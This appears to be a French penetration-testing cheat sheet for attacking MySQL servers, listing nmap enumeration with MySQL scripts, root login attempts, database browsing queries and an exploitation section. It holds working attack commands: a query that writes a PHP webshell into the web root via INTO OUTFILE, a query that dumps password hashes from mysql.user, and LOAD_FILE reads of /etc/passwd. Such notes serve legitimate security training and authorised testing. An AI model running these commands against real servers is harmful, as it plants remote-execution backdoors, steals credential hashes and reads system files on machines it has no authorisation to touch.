---
public: true 
#Tags: tag1, tag2
---

Port : 3306

## Enumeration

```shell-session
sudo nmap $TARGET_IP -sV -sC -p3306 --script "mysql-*"
```

## Connexion

```
# Connexion en tant qu'utilisateur 'root'

#    - Sans mot de passe
mysql -h $TARGET_IP -u root  -P 3306

#    - Avec mot de passe
mysql -h $TARGET_IP -u root  -pLeMotDePasseSansEspace -P 3306
```

## Commandes utiles

```Mysql
-- Voir les privilèges dont on dispose
show grants; 

select version();

show databases;

use <database>;

show tables;
show columns from <table>;
select * from <table> where <column> = "<texte>";
select * from <table> where <column> like "<debut du texte>%";


-- Consultation de la valeur de secure_file_priv
-- selon sa valeur, l'écrite dans un fichier via INTO OUTFILE sera possible ou non
-- si VIDE : on peut l'utiliser. si pointe vers un dossier, seul ce dossier est autorisé en export. Si NULL : désactivé
 show variables like "secure_file_priv";
-- Ecriture d'un webshell 
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';


-- dump des hash de la DB
SELECT SUBSTR(authentication_string,2) AS hash FROM mysql.user WHERE plugin = 'mysql_native_password' AND authentication_string NOT LIKE '%THISISNOTAVALIDPASSWORD%' AND authentication_string !=''

```

## Exploitation

### Lecture d'un fichier

```
-- Ne fonctionne pas sur une in stallation par défaut
select LOAD_FILE("/etc/passwd");
select TO_BASE64(LOAD_FILE("/etc/passwd"));

```
